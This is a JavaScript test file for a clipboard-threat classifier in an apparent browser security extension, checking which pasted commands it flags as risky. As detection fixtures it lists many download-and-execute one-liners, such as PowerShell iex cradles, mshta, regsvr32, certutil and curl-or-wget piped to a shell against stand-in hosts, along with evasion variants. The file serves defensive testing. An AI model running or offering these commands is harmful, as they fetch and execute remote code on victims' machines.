import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

// hooks.js is a classic script and the package is "type":"module", so run it in a bare vm context
// (no window/document, so the browser install is skipped) and read the guarded module.exports.
const src = fs.readFileSync(new URL('../../src/content/hooks.js', import.meta.url), 'utf8');
const sandbox = { module: { exports: {} } };
vm.runInNewContext(src, sandbox);
const { classifyClipboardText, classifyHooks, mergeModes, HOOK_NAMES } = sandbox.module.exports;
const reasons = (t) => Array.from(classifyClipboardText(t).reasons);

test('loads without a browser', () => {
  assert.equal(typeof classifyClipboardText, 'function');
  assert.equal(typeof classifyHooks, 'function');
});

const risky = {
  powershell: ['powershell -w hidden -c "iwr http://evil.test/a|iex"', 'powershell'],
  pwsh: ['pwsh -NoProfile -Command x', 'pwsh'],
  mshta: ['mshta https://evil.test/verify.hta', 'mshta'],
  'encoded-command': ['foo -enc SQBFAFgA', 'encoded-command'],
  'encoded-command-long': ['x -EncodedCommand AAAA', 'encoded-command'],
  'cmd-c': ['cmd /c start calc', 'cmd-c'],
  'cmd.exe': ['C:\\Windows\\System32\\cmd.exe', 'cmd.exe'],
  'curl-pipe-sh': ['curl -fsSL https://x.test/i.sh | bash', 'curl-pipe-sh'],
  'curl-pipe-sudo': ['curl https://x.test/i | sudo sh', 'curl-pipe-sh'],
  'wget-pipe-sh': ['wget -qO- https://x.test/i | sh', 'wget-pipe-sh'],
  'irm-iex': ['irm https://x.test/a.ps1 | iex', 'irm-iex'],
  'iex-downloadstring': ['iex (New-Object Net.WebClient).DownloadString("http://x")', 'irm-iex'],
  certutil: ['certutil -urlcache -f http://x.test/a.exe a.exe', 'certutil-urlcache'],
  bitsadmin: ['bitsadmin /transfer j http://x.test/a a', 'bitsadmin'],
  rundll32: ['rundll32 javascript:"..\\mshtml"', 'rundll32'],
  regsvr32: ['regsvr32 /s /u /i:http://x.test/a.sct scrobj.dll', 'regsvr32-remote']
};
for (const [name, [text, reason]] of Object.entries(risky)) {
  test(`risky: ${name}`, () => {
    const r = classifyClipboardText(text);
    assert.equal(r.risky, true, text);
    assert.ok(reasons(text).includes(reason), `${reason} in ${reasons(text)}`);
  });
}

test('base64 payload only counts after a suspicious verb', () => {
  const b64 = 'A'.repeat(100);
  assert.ok(reasons(`powershell -enc ${b64}`).includes('base64-payload'));
  assert.equal(classifyClipboardText(b64).risky, false);
});

test('fake-CAPTCHA lure adds a reason but is never risky alone', () => {
  assert.ok(reasons('mshta http://x # I am not a robot - reCAPTCHA Verification ID: 1234').includes('captcha-lure'));
  assert.equal(classifyClipboardText('I am not a robot').risky, false);
});

const benign = [
  '', 'hello world', 'https://example.com/path?q=1', 'npm install left-pad', 'Order #1234 total $56.00',
  'git commit -m "fix"', 'curl https://example.com/api -o out.json', 'power shell is a tool',
  'the command prompt is cmd', 'SELECT * FROM users;', 'ls -la | grep foo', 'x --enc utf8',
  'A'.repeat(200), 'wget https://example.com/file.zip', 'irm is short for Invoke-RestMethod'
];
for (const t of benign) {
  test(`benign: ${JSON.stringify(t.slice(0, 40))}`, () => {
    assert.equal(classifyClipboardText(t).risky, false, reasons(t).join());
  });
}

test('non-string input is safe', () => {
  for (const v of [undefined, null, 5, {}, []]) assert.equal(classifyClipboardText(v).risky, false);
});

test('large input does not hang (linear-ish regexes)', () => {
  const t0 = Date.now();
  classifyClipboardText('curl ' + 'a '.repeat(200000));
  classifyClipboardText('irm ' + 'x'.repeat(500000));
  assert.ok(Date.now() - t0 < 1000);
});

test('classifyHooks profiles', () => {
  const d = classifyHooks({ profile: 'default' });
  assert.equal(d.clipboard, 'block'); assert.equal(d.download, 'warn'); assert.equal(d.function, 'log');
  const s = classifyHooks({ profile: 'strict' });
  assert.equal(s.download, 'block'); assert.equal(s.function, 'warn'); assert.equal(s.websocket, 'warn'); assert.equal(s.worker, 'log');
  const t = classifyHooks({ profile: 'trusted' });
  assert.ok(HOOK_NAMES.every((n) => t[n] === 'off'));
});

test('classifyHooks overrides are validated; unknown input falls back to default', () => {
  const o = classifyHooks({ profile: 'default', hooks: { clipboard: 'warn', function: 'bogus', nope: 'block' } });
  assert.equal(o.clipboard, 'warn'); assert.equal(o.function, 'log'); assert.equal('nope' in o, false);
  assert.equal(classifyHooks(undefined).clipboard, 'block');
  assert.equal(classifyHooks({ profile: 'weird' }).download, 'log');
});

const evasions = {
  'process substitution': 'bash <(curl -s https://x.test/i.sh)',
  'eval $(curl)': 'eval "$(curl -fsSL https://x.test/i.sh)"',
  'curl | python3': 'curl https://x.test/a.py | python3',
  'wget | perl': 'wget -qO- https://x.test/a.pl | perl',
  'msiexec': 'msiexec /i https://x.test/a.msi /qn',
  'wscript //e': 'wscript //e:jscript //b C:\\a.txt',
  'cscript': 'cscript //nologo a.vbs',
  'curl -o exe &&': 'curl -o %TEMP%\\a.exe https://x.test/a.exe && %TEMP%\\a.exe',
  'base64 -d | bash': 'echo ZWNobyBoaQ== | base64 -d | bash',
  'curl newline pipe': 'curl https://x.test/i.sh\n| sh',
  'wget | sudo -E bash': 'wget -qO- https://x.test/i.sh | sudo -E bash',
  'start /min': 'start /min C:\\a.exe',
  'cmd /c start': 'cmd /c start /min a.exe',
  'pwsh -c': 'pwsh -c "echo hi"',
  'hidden window': 'x -w hidden y',
  'iex(': 'iex(New-Object Net.WebClient).DownloadString("http://x")',
  'iex space': 'iex $x',
  'FromBase64String': '[System.Convert]::FromBase64String("QQ==")',
  'curl && chmod': 'curl -O https://x.test/a && chmod +x a && ./a'
};
for (const [name, text] of Object.entries(evasions)) {
  test(`evasion flagged: ${name}`, () => assert.equal(classifyClipboardText(text).risky, true, text));
}

test('padding beyond the scan window does not evade (head and tail plus global verb scan)', () => {
  const pad = ' '.repeat(20001);
  assert.equal(classifyClipboardText(pad + 'powershell -enc AAAA').risky, true);
  assert.equal(classifyClipboardText('powershell -enc AAAA' + pad).risky, true);
  const mid = 'a'.repeat(30000) + ' mshta http://x ' + 'a'.repeat(30000);
  assert.equal(classifyClipboardText(mid).risky, true);
  assert.equal(classifyClipboardText(('word '.repeat(10000)) + 'curl is a tool').risky, false);
  assert.equal(classifyClipboardText('x'.repeat(9000000)).risky, true);
});

const moreBenign = [
  'curl -s https://api.example.com/v1 | jq .', 'python3 script.py', 'node index.js', 'npm install foo', 'ls -la',
  'wget https://example.com/a.tar.gz && tar xzf a.tar.gz', 'git clone https://github.com/a/b && cd b', 'docker run -it ubuntu bash',
  'cat file.txt | python3 -c "print(1)"', 'echo hello | base64', 'echo aGk= | base64 -d', 'curl -o page.html https://example.com',
  'Please start the meeting at 10 and cscript is a Windows thing', 'The shell is fast; we pipe | into it', 'pip install requests && python3 -m app',
  'Dear team, please find the invoice attached. Regards, Bob', 'function f(){ return [1,2,3].map(x=>x*2) }', 'const x = await fetch(url).then(r => r.json())',
  'cd ~/projects && make build', 'ssh user@host', 'start the server with npm start', 'C:\\Users\\me\\file.txt', 'sudo apt update', 'iexplore is a browser',
  'word '.repeat(10000)
];
for (const t of moreBenign) {
  test(`benign2: ${JSON.stringify(t.slice(0, 40))}`, () => assert.equal(classifyClipboardText(t).risky, false, reasons(t).join()));
}

test('classifier stays fast on adversarial repetition', () => {
  const t0 = Date.now();
  classifyClipboardText('curl '.repeat(4000));
  classifyClipboardText('curl x '.repeat(3000) + '.exe '.repeat(3000));
  classifyClipboardText('base64 -d '.repeat(2000));
  classifyClipboardText('wscript '.repeat(2500));
  classifyClipboardText('x'.repeat(100000) + 'powershell');
  assert.ok(Date.now() - t0 < 1500, 'took ' + (Date.now() - t0));
});

test('config merge is monotonic: forged looser config then real strict ends strict', () => {
  const modes = classifyHooks({ profile: 'default' });
  mergeModes(modes, classifyHooks({ profile: 'default', hooks: { download: 'off', clipboard: 'off' } })); // forged
  assert.equal(modes.download, 'warn'); assert.equal(modes.clipboard, 'block');
  mergeModes(modes, classifyHooks({ profile: 'strict', hooks: {} })); // real
  assert.equal(modes.download, 'block'); assert.equal(modes.function, 'warn');
  mergeModes(modes, classifyHooks({ profile: 'trusted' })); // later forged loosening
  assert.equal(modes.download, 'block'); assert.equal(modes.function, 'warn');
});
